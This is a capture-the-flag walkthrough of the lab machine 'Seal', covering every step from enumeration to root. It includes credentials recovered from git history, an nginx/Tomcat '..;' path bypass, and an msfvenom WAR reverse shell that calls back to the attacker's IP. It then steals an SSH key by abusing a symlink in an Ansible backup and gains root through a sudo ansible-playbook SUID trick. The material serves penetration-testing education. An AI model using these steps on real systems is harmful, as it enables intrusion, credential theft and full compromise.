<p><strong>Machine:</strong> Seal<br /><strong>OS:</strong> Linux<br /><strong>Difficulty:</strong> Medium<br /><strong>IP:</strong> <code>10.129.95.190</code><br /><strong>Attacker IP:</strong> <code>10.10.17.27</code>  </p>

<h2 id="enumeration">Enumeration</h2>
<h3 id="step-1-add-target-to-etc-hosts">Step 1: Add target to /etc/hosts</h3>
<pre><code class="language-bash" data-language="bash">echo "10.129.95.190 seal.htb" | sudo tee -a /etc/hosts
</code></pre>
<p><strong>Why this matters:</strong> The SSL certificate on port 443 reveals the hostname <code>seal.htb</code>. Many web applications perform virtual host routing based on the <code>Host</code> header. Without this DNS mapping, we might miss important functionality or get redirected to invalid domains.</p>
<p><strong>Hacker Mindset:</strong> <em>Always check SSL certificates.</em> They often contain domain names, organization info, and sometimes even email addresses that expand your attack surface. This is passive reconnaissance at its finest.</p>
<hr />
<h3 id="step-2-service-discovery-nmap">Step 2: Service Discovery (Nmap)</h3>
<pre><code class="language-bash" data-language="bash">nmap -sV -v -p- --min-rate=10000 10.129.95.190
</code></pre>
<p><strong>Results:</strong></p>
<ul>
<li><strong>Port 22/tcp</strong> - OpenSSH 8.2p1 Ubuntu</li>
<li><strong>Port 443/tcp</strong> - nginx 1.18.0 (Ubuntu) - HTTPS</li>
<li><strong>Port 8080/tcp</strong> - GitBucket</li>
</ul>
<p><strong>Hacker Mindset:</strong> <em>Port 8080 is your friend.</em> When you see port 443 (standard HTTPS) alongside 8080, 8080 is almost always some kind of backend service, admin panel, or development tool. The combination of nginx + another HTTP service screams "reverse proxy" - and reverse proxies are notorious for path normalization bugs.</p>
<hr />
<h2 id="initial-reconnaissance">Initial Reconnaissance</h2>
<h3 id="step-3-explore-port-443-the-main-website">Step 3: Explore Port 443 (The Main Website)</h3>
<p>Visit <code>https://seal.htb</code> in the browser.</p>
<p><strong>What we see:</strong> A vegetable market website called "Seal Market" - mostly static content.</p>
<p><strong>What we look for:</strong></p>
<ul>
<li>Search functionality (potential injection points)</li>
<li>Contact forms (potential XSS or SSRF)</li>
<li>Admin links or directories</li>
<li>Technology stack indicators</li>
</ul>
<p><strong>Key Findings:</strong></p>
<ul>
<li><code>/admin</code> and <code>/manager</code> directories exist (found via directory fuzzing)</li>
<li><code>/manager/html</code> returns <strong>403 Forbidden</strong></li>
<li><code>/admin/dashboard</code> is protected by mutual TLS authentication</li>
</ul>
<p><strong>Hacker Mindset:</strong> <em>When you see 403 Forbidden on <code>/manager</code> or <code>/admin</code>, don't give up.</em> A 403 means the resource EXISTS but you can't access it. This is fundamentally different from a 404. The server is telling you "there's something here, but I'm not letting you in." Your job is to find the bypass.</p>
<hr />
<h3 id="step-4-explore-port-8080-gitbucket">Step 4: Explore Port 8080 (GitBucket)</h3>
<p>Visit <code>http://seal.htb:8080</code></p>
<p><strong>What we see:</strong> GitBucket - a GitHub-like platform powered by Scala.</p>
<p><strong>Why this is huge:</strong> Code repositories often contain:</p>
<ul>
<li>Hardcoded credentials</li>
<li>Configuration files with passwords</li>
<li>API keys</li>
<li>Infrastructure definitions</li>
<li>Commit history with sensitive data</li>
</ul>
<p><strong>Hacker Mindset:</strong> <em>Version control is a treasure trove.</em> Developers frequently commit credentials "temporarily" and forget to remove them. Even if they "fix" it in a later commit, the sensitive data remains in the commit history forever. Always check the full commit history, not just the latest files.</p>
<hr />
<h2 id="gitbucket-the-goldmine">GitBucket - The Goldmine</h2>
<h3 id="step-5-register-a-gitbucket-account">Step 5: Register a GitBucket Account</h3>
<p>Click <strong>Register</strong> and create any account (e.g., <code>testtest</code> / <code>password</code>).</p>
<p><strong>Why:</strong> GitBucket allows self-registration. Once logged in, we can browse public repositories.</p>
<hr />
<h3 id="step-6-discover-repositories">Step 6: Discover Repositories</h3>
<p>After logging in, we see two repositories under the <code>root</code> organization:</p>
<ul>
<li><code>root/seal_market</code> - The main web application</li>
<li><code>root/infra</code> - Infrastructure configurations</li>
</ul>
<p><strong>Hacker Mindset:</strong> <em>Prioritize repositories based on names.</em> <code>seal_market</code> is clearly the main application. Infrastructure repos often contain deployment scripts, Docker files, and - most importantly - configuration files with credentials.</p>
<hr />
<h3 id="step-7-analyze-seal-market-repository">Step 7: Analyze <code>seal_market</code> Repository</h3>
<p>Navigate to <code>root/seal_market</code> → <code>tomcat/</code> directory.</p>
<p><strong>What we find:</strong> <code>tomcat-users.xml</code> - the configuration file for Tomcat user authentication.</p>
<p><strong>Current version:</strong> Contains no credentials (they were removed in the latest commit).</p>
<p><strong>Hacker Mindset:</strong> <em>Always check commit history.</em> The current file might be clean, but developers often "remove" credentials by committing a new version without them. The old commit still exists in the repository's history.</p>
<hr />
<h3 id="step-8-hunt-credentials-in-commit-history">Step 8: Hunt Credentials in Commit History</h3>
<p>Navigate to the file history of <code>tomcat-users.xml</code>.</p>
<p><strong>Commits found:</strong></p>
<ol>
<li><code>971f3aa</code> - "Updating tomcat configuration" (newer)</li>
<li><code>ac21032</code> - "Adding tomcat configuration" (older)</li>
</ol>
<p>Click the <strong>older</strong> commit (<code>ac21032</code>) to view the diff.</p>
<p><strong>JACKPOT:</strong></p>
<pre><code class="language-xml" data-language="xml">&lt;user username="tomcat" password=REDACTED roles="manager-gui,admin-gui"/&gt;
</code></pre>
<p><strong>Why this works:</strong> The developers added the configuration with credentials, then later "updated" it to remove the credentials. But Git preserves the entire history.</p>
<p><strong>Hacker Mindset:</strong> <em>Think like a developer.</em> When you see "updating" a config file, ask yourself: "What was updated?" Often, "updates" are actually security fixes - which means the old version had a vulnerability (or credential) that you can exploit.</p>
<hr />
<h3 id="step-9-verify-tomcat-manager-access">Step 9: Verify Tomcat Manager Access</h3>
<p>With credentials in hand, try accessing the Tomcat Manager:</p>
<pre><code class="language-bash" data-language="bash">curl -k -u REDACTED https://seal.htb/manager/html
</code></pre>
<p><strong>Result:</strong> 403 Forbidden</p>
<p><strong>But wait!</strong> We can access other endpoints:</p>
<ul>
<li><code>https://seal.htb/manager/status</code> - Works (asks for auth, accepts credentials)</li>
<li><code>https://seal.htb/manager/jmxproxy</code> - Also works with auth</li>
</ul>
<p><strong>Hacker Mindset:</strong> <em>A 403 on one endpoint doesn't mean total failure.</em> Tomcat has multiple manager interfaces (<code>/html</code>, <code>/text</code>, <code>/jmxproxy</code>, <code>/status</code>). If one is blocked, test them all. The HTML interface (<code>/manager/html</code>) is the most powerful because it allows WAR deployment.</p>
<hr />
<h2 id="tomcat-manager-access-via-path-traversal">Tomcat Manager Access via Path Traversal</h2>
<h3 id="step-10-the-nginx-tomcat-path-normalization-bug">Step 10: The Nginx-Tomcat Path Normalization Bug</h3>
<p><strong>The Core Vulnerability:</strong></p>
<p>nginx and Apache Tomcat normalize URLs differently:</p>
<ul>
<li><strong>nginx</strong> normalizes <code>..</code> sequences before routing</li>
<li><strong>Tomcat</strong> does NOT normalize <code>..;</code> sequences the same way</li>
</ul>
<p>This difference creates a <strong>path traversal bypass</strong> when nginx is used as a reverse proxy for Tomcat.</p>
<p><strong>Why this happens:</strong></p>
<ul>
<li>nginx sees <code>/manager/status/..;/html</code> and thinks: "<code>status/..</code> cancels out, leaving <code>/manager/html</code>"</li>
<li>But Tomcat sees <code>/manager/status/..;/html</code> and interprets <code>..;</code> differently, routing to <code>/manager/html</code> while bypassing nginx's access controls</li>
</ul>
<p><strong>Hacker Mindset:</strong> <em>Understand your architecture.</em> When you see nginx + Tomcat, immediately think about path normalization differences. This is a well-known attack pattern. The Acunetix article on "Tomcat path traversal via reverse proxy mapping" documents this exact scenario.</p>
<p><strong>Hacker Mindset:</strong> <em>Parsers are evil.</em> Every time two systems parse the same input differently, there's a potential vulnerability. URL parsing, path normalization, HTTP header parsing - these are all prime targets for bypasses.</p>
<hr />
<h3 id="step-11-access-the-manager-via-bypass">Step 11: Access the Manager via Bypass</h3>
<p><strong>Browser:</strong></p>
<pre><code>https://seal.htb/manager/status/..;/html
</code></pre>
<p><strong>Authentication:</strong></p>
<ul>
<li>Username: <code>tomcat</code></li>
<li>Password: null</li>
</ul>
<p><strong>Result:</strong> Full access to the Tomcat Web Application Manager!</p>
<p><strong>Alternative bypass paths that also work:</strong></p>
<pre><code>https://seal.htb/manager/..;/html
https://seal.htb/manager/foo/..;/html
https://seal.htb/admin/foo/..;/dashboard/
</code></pre>
<p><strong>Hacker Mindset:</strong> <em>When you find one bypass, keep fuzzing.</em> Different bypass variants might work for different operations (GET vs POST, upload vs listing). Having multiple bypass strings in your arsenal gives you flexibility.</p>
<hr />
<h2 id="foothold-war-reverse-shell">Foothold - WAR Reverse Shell</h2>
<h3 id="step-12-generate-a-war-reverse-shell">Step 12: Generate a WAR Reverse Shell</h3>
<p>On Kali:</p>
<pre><code class="language-bash" data-language="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.27 LPORT=4444 -f war -o shell.war
</code></pre>
<p><strong>Why a WAR file:</strong> Tomcat's primary deployment format is WAR (Web Application Archive). The manager interface allows uploading WAR files, which Tomcat automatically deploys as running web applications.</p>
<p><strong>Hacker Mindset:</strong> <em>Use the platform's native deployment mechanism.</em> Tomcat is designed to deploy WARs. Instead of trying to exploit a buffer overflow or SQL injection, we're simply using Tomcat's legitimate functionality - but with a malicious payload. This is much more reliable.</p>
<hr />
<h3 id="step-13-start-the-listener">Step 13: Start the Listener</h3>
<p>On Kali:</p>
<pre><code class="language-bash" data-language="bash">nc -nlvp 4444
</code></pre>
<p>Leave this running in a separate terminal.</p>
<hr />
<h3 id="step-14-deploy-the-war-shell">Step 14: Deploy the WAR Shell</h3>
<p><strong>The Challenge:</strong> The upload form on the manager page submits to <code>/manager/html/upload</code>, which is blocked by nginx. We need to modify the form's action to use our bypass path.</p>
<p><strong>Method 1: Browser DevTools</strong></p>
<ol>
<li>Go to <code>https://seal.htb/manager/status/..;/html</code></li>
<li>Scroll to "WAR file to deploy"</li>
<li>Press <strong>F12</strong> → Inspector</li>
<li>Find the <code>&lt;form&gt;</code> tag for the WAR upload</li>
<li>Change <code>action="/manager/html/upload?CSRF_NONCE=..."</code> to <code>action="/manager/.;/html/upload?CSRF_NONCE=..."</code></li>
<li>Select <code>shell.war</code></li>
<li>Click <strong>Deploy</strong></li>
</ol>
<p><strong>Method 2: Burp Suite</strong></p>
<ol>
<li>Intercept the upload request</li>
<li>Change the POST path from <code>/manager/html/upload</code> to <code>/manager/status/..;/html/upload</code></li>
<li>Forward the request</li>
</ol>
<p><strong>Method 3: curl (after obtaining a fresh CSRF nonce)</strong></p>
<pre><code class="language-bash" data-language="bash">curl -k -u REDACTED \
  'https://seal.htb/manager/status/..;/html/upload?org.apache.catalina.filters.CSRF_NONCE=YOUR_NONCE' \
  -F 'deployWar=@/home/kali/Downloads/seal/shell.war' \
  -F 'deployPath=/shell'
</code></pre>
<p><strong>Result:</strong> The WAR deploys successfully. A new application <code>/shell</code> appears in the applications list.</p>
<p><strong>Hacker Mindset:</strong> <em>CSRF protection is client-side theater.</em> The CSRF nonce is generated by the server and validated on submission - but it's tied to your authenticated session. As long as you have a valid session and include the nonce, the server accepts the request. The path traversal bypass works because nginx doesn't see the destination you're actually hitting.</p>
<hr />
<h3 id="step-15-trigger-the-shell">Step 15: Trigger the Shell</h3>
<p>Visit <code>https://seal.htb/shell/</code> in the browser (or click the <code>/shell</code> application in the manager).</p>
<p><strong>On your Kali listener:</strong></p>
<pre><code>connect to [10.10.17.27] from (UNKNOWN) [10.129.95.190] 44888
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
</code></pre>
<p><strong>Hacker Mindset:</strong> <em>Trigger the payload.</em> Many people deploy shells but forget to trigger them. A WAR shell needs an HTTP request to execute the JSP payload. Simply visiting the application's root URL is enough.</p>
<hr />
<h3 id="step-16-stabilize-the-shell">Step 16: Stabilize the Shell</h3>
<pre><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
</code></pre>
<p>Then press <strong>Ctrl+Z</strong> on Kali, run <code>stty raw -echo; fg</code>, and press Enter twice.</p>
<p><strong>Why stabilize:</strong> A basic netcat shell has no job control, no tab completion, and no command history. A PTY shell is much easier to work with for complex enumeration.</p>
<hr />
<h2 id="lateral-movement-to-user-luis">Lateral Movement to User (luis)</h2>
<h3 id="step-17-initial-enumeration-as-tomcat">Step 17: Initial Enumeration as <code>tomcat</code></h3>
<pre><code class="language-bash" data-language="bash">ls -la /home/
ps aux | grep -i backup
</code></pre>
<p><strong>Key Findings:</strong></p>
<ul>
<li>User <code>luis</code> exists</li>
<li>A root process runs: <code>/bin/sh -c sleep 30 &amp;&amp; sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml</code></li>
<li><code>/opt/backups/archives/</code> contains <code>.gz</code> backup files</li>
</ul>
<p><strong>Hacker Mindset:</strong> <em>Processes reveal everything.</em> <code>ps aux</code> is one of the most powerful commands for privilege escalation. It shows you what's running, as whom, and with what arguments. A root process that runs <code>sudo -u luis ansible-playbook</code> is immediately suspicious - it's a privileged action being performed on behalf of a lower-privileged user.</p>
<hr />
<h3 id="step-18-analyze-the-ansible-playbook">Step 18: Analyze the Ansible Playbook</h3>
<pre><code class="language-bash" data-language="bash">cat /opt/backups/playbook/run.yml
</code></pre>
<p><strong>Content:</strong></p>
<pre><code class="language-yaml" data-language="yaml">- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
</code></pre>
<p><strong>The Critical Detail:</strong> <code>copy_links=yes</code></p>
<p><strong>What <code>copy_links=yes</code> means:</strong> The <code>synchronize</code> module (which uses rsync under the hood) will follow symbolic links and copy the TARGET of the symlink, not the symlink itself.</p>
<p><strong>Hacker Mindset:</strong> <em>Read every configuration file carefully.</em> <code>copy_links=yes</code> is a security anti-pattern in backup scripts. It means: "If you put a symlink in the source directory, the backup will copy whatever the symlink points to." This is essentially an arbitrary file read vulnerability.</p>
<p><strong>Hacker Mindset:</strong> <em>Symlinks are weapons.</em> In Linux, symlinks are one of the most powerful tools for privilege escalation and path traversal. When a privileged process follows symlinks, it often reads or writes files it shouldn't have access to.</p>
<hr />
<h3 id="step-19-identify-writable-directories-in-the-backup-source">Step 19: Identify Writable Directories in the Backup Source</h3>
<pre><code class="language-bash" data-language="bash">ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard
</code></pre>
<p><strong>Permissions:</strong></p>
<pre><code>drwxr-xr-x 7 root root 4096 May  7  2021 .
drwxrwxrwx 2 root root 4096 May  7  2021 uploads
</code></pre>
<p><strong>Key Finding:</strong> <code>uploads</code> is <code>drwxrwxrwx</code> - world-writable!</p>
<p><strong>Hacker Mindset:</strong> <em>World-writable directories in backup scopes are gold.</em> If a privileged backup process copies a world-writable directory, and that process follows symlinks, you can make it read ANY file that the backup process's user can read.</p>
<hr />
<h3 id="step-20-create-the-symlink-trap">Step 20: Create the Symlink Trap</h3>
<pre><code class="language-bash" data-language="bash">cd [redacted encoded lab material]
ln -s /home/luis/.ssh luis-ssh
ls -la
</code></pre>
<p><strong>What this does:</strong> Creates a symlink named <code>luis-ssh</code> pointing to <code>/home/luis/.ssh</code>. When the Ansible backup runs, <code>rsync</code> with <code>copy_links=yes</code> follows this symlink and copies luis's SSH private key into the backup archive.</p>
<p><strong>Hacker Mindset:</strong> <em>Be patient.</em> The backup runs on a schedule (roughly every minute after a 30-second sleep). You can't rush the cron. Set up your trap and wait.</p>
<hr />
<h3 id="step-21-wait-for-the-backup-and-extract-the-key">Step 21: Wait for the Backup and Extract the Key</h3>
<p><strong>Monitor for new backups:</strong></p>
<pre><code class="language-bash" data-language="bash">ls -la /opt/backups/archives/
</code></pre>
<p>When a new <code>.gz</code> file appears with a recent timestamp, copy and extract it:</p>
<pre><code class="language-bash" data-language="bash">cp /opt/backups/archives/backup-YYYY-MM-DD-HH:MM:SS.gz /tmp/backup.gz
cd /tmp
gunzip backup.gz
tar -xf backup
cat dashboard/uploads/luis-ssh/id_rsa
</code></pre>
<p><strong>Result:</strong> Luis's SSH private key!</p>
<p><strong>Hacker Mindset:</strong> <em>Timing is everything.</em> The uploads directory on this machine gets cleaned periodically (likely by the web application). You need to create the symlink and catch the backup before the cleaner removes it. If you miss the window, just recreate the symlink and try again.</p>
<hr />
<h3 id="step-22-ssh-as-luis">Step 22: SSH as <code>luis</code></h3>
<p>On Kali, save the key:</p>
<pre><code class="language-bash" data-language="bash">nano luis_id_rsa
# Paste the key
chmod 600 luis_id_rsa
ssh -i luis_id_rsa luis@seal.htb
</code></pre>
<p><strong>Verify access:</strong></p>
<pre><code class="language-bash" data-language="bash">whoami
# luis
cat /home/luis/user.txt
# abd4808[redacted]ee3469108
</code></pre>
<p><strong>Hacker Mindset:</strong> <em>Keys are better than passwords.</em> SSH keys don't expire, aren't subject to password policies, and often grant access to multiple systems. Once you steal a private key, you own that identity until the key is rotated.</p>
<hr />
<h2 id="privilege-escalation-to-root">Privilege Escalation to Root</h2>
<h3 id="step-23-check-sudo-permissions">Step 23: Check sudo Permissions</h3>
<pre><code class="language-bash" data-language="bash">sudo -l
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
</code></pre>
<p><strong>Translation:</strong> Luis can run <strong>any</strong> Ansible playbook as <strong>root</strong> without a password.</p>
<p><strong>Hacker Mindset:</strong> <code>sudo -l</code> is the first command you run after gaining any user access. It's the fastest way to find the path to root. A wildcard (<code>*</code>) after a command in sudoers is almost always exploitable.</p>
<hr />
<h3 id="step-24-exploit-ansible-playbook-for-root">Step 24: Exploit Ansible-Playbook for Root</h3>
<p><strong>Why this works:</strong> Ansible playbooks are YAML files that define tasks to be executed on target hosts. When run with <code>sudo</code>, those tasks execute as root. By creating a playbook that runs <code>chmod +s /bin/bash</code>, we grant ourselves a SUID root shell.</p>
<p><strong>Create the malicious playbook:</strong></p>
<pre><code class="language-bash" data-language="bash">cd /dev/shm
cat &gt; root.yml &lt;&lt; 'EOF'
- hosts: localhost
  tasks:
    - name: pwn
      command: chmod +s /bin/bash
EOF
</code></pre>
<p><strong>Execute it:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo /usr/bin/ansible-playbook root.yml
</code></pre>
<p><strong>Result:</strong></p>
<pre><code>TASK [pwn] ********************************************************************
changed: [localhost]
</code></pre>
<p><strong>Hacker Mindset:</strong> <em>GTFOBins is your bible.</em> Ansible-playbook is listed on GTFOBins as a sudo exploitation vector. Whenever you see a command with <code>NOPASSWD</code> and a wildcard, check GTFOBins immediately.</p>
<hr />
<h3 id="step-25-spawn-root-shell">Step 25: Spawn Root Shell</h3>
<pre><code class="language-bash" data-language="bash">/bin/bash -p
whoami
# root
cat /root/root.txt
# 3309f4d[redacted]92773a5a7
</code></pre>
<p><strong>Why <code>/bin/bash -p</code>:</strong> The <code>-p</code> flag tells bash to run in privileged mode, preserving the effective user ID (EUID). Since we set the SUID bit on <code>/bin/bash</code>, running it with <code>-p</code> gives us a root shell.</p>
<p><strong>Hacker Mindset:</strong> <em>SUID binaries are the classic Unix privilege escalation.</em> Setting the SUID bit on <code>/bin/bash</code> is the nuclear option - it gives you a permanent root shell that works even if your current session dies. Just remember: on a real penetration test, you should clean this up afterward.</p>

<h2 id="hacker-mindset-and-lessons-learned">Hacker Mindset &amp; Lessons Learned</h2>
<h3 id="1-the-value-of-commit-history">1. The Value of Commit History</h3>
<p>Developers are human. They commit credentials, API keys, and secrets. Even when they "fix" their mistake in a later commit, the sensitive data remains in the repository history forever. <strong>Always check commit diffs and history.</strong></p>
<h3 id="2-reverse-proxies-are-dangerous">2. Reverse Proxies Are Dangerous</h3>
<p>When nginx (or Apache, or CloudFlare) sits in front of an application server, the two systems must agree on how to parse URLs. When they disagree, you get bypasses. <strong>Study path normalization differences.</strong></p>
<h3 id="3-configuration-files-are-exploitable">3. Configuration Files Are Exploitable</h3>
<p><code>copy_links=yes</code> in a backup script is a vulnerability. Any time a privileged process follows symlinks or expands wildcards in user-controlled directories, ask yourself: "Can I control what gets followed/expanded?"</p>
<h3 id="4-processes-don-t-lie">4. Processes Don't Lie</h3>
<p><code>ps aux</code> reveals cron jobs, backup scripts, and periodic tasks that configuration files might not. A process running as root that touches user-writable directories is always worth investigating.</p>
<h3 id="5-wildcards-in-sudoers-are-wild">5. Wildcards in sudoers Are Wild</h3>
<p><code>(ALL) NOPASSWD: /usr/bin/ansible-playbook *</code> means you can run ANY playbook as root. The asterisk is the enemy of security. <strong>Always check <code>sudo -l</code> first.</strong></p>
<h3 id="6-patience-and-persistence">6. Patience and Persistence</h3>
<p>The backup trick failed multiple times because the uploads cleaner removed our symlink. We had to recreate it, wait for the exact backup window, and extract quickly. <strong>Real hacking involves failure, iteration, and timing.</strong></p>
<h3 id="7-suid-is-king">7. SUID Is King</h3>
<p>When you can't find a clean exploit, making a binary SUID is a reliable way to establish persistent root access. <code>/bin/bash -p</code> is the simplest, most reliable root shell technique on Linux.</p>
